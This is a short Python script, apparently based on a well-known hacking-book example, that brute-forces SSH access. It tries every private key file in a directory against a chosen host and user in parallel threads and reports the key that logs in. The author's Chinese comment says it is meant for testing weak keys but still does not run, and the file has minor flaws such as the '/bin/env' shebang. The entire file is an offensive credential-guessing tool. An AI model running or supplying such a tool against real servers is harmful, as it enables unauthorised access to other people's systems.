#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
"""
2017.01.31 测试弱密钥的, 虽然依旧是跑不了...
"""
import pexpect
import optparse
import os
import threading

__author__ = '__L1n__w@tch'

max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)
stop = False
fails = 0


def connect(user, host, key_file, release):
    global stop, fails
    try:
        perm_denied = "Permission denied"
        ssh_new_key = "Are you sure you want to continue"
        conn_closed = "Connection closed by remote host"

        opt = " -o PasswordAuthentication=no"
        conn_str = "ssh {}@{} -i {}{}".format(user, host, key_file, opt)
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_new_key, conn_closed, "$", "#", ])
        if ret == 2:
            print("[-] Adding Host to !/.ssh/known_hosts")
            child.sendline("yes")
            connect(user, host, key_file, False)
        elif ret == 3:
            print("[-] Connection Closed By Remote Host")
            fails += 1
        elif ret > 3:
            print("[+] Success. {}".format(key_file))
            stop = True
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser("usage %prog -H <target_host> -u <user> -d <directory>")
    parser.add_option("-H", dest="target_host", type=str, help="specify target host")
    parser.add_option("-d", dest="pass_dir", type=str, help="specify directory with keys")
    parser.add_option("-u", dest="user", type=str, help="specify the user")

    options, args = parser.parse_args()
    target_host = options.target_host
    pass_dir = options.pass_dir
    user = options.user

    if target_host is None or pass_dir is None or user is None:
        print(parser.usage)
        exit(-1)

    for file_name in os.listdir(pass_dir):
        if stop:
            print("[*] Exiting: Key Found.")
            exit(0)
        if fails > 5:
            print("[!] Exiting: Too Many Connections Closed By Remote Host.")
            print("[!] Adjust number of simultaneous threads.")
            exit(0)
        connection_lock.acquire()

        full_path = os.path.join(pass_dir, file_name)
        print("[-] Testing keyfile {}".format(full_path))
        t = threading.Thread(target=connect, args=(user, target_host, full_path, True))
        child = t.start()


if __name__ == "__main__":
    main()
